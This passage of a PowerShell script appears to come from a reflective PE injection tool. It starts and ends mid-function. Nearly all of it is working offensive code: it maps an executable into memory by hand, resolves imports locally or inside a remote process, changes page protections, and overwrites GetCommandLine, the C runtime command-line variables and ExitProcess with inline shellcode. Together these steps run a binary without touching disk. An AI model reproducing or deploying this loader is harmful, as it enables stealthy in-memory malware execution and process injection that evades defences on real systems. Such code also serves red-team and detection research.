				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$LoadByOrdinal = $false
					[IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
						$LoadByOrdinal = $true
					}
					elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
						$LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
						$ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						if ($LoadByOrdinal)
						{
							Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
						}
						else
						{
							Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
						}
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

					#Cleanup
					#If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
					if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
					{
						[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
						$ProcedureNamePtr = [IntPtr]::Zero
					}
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
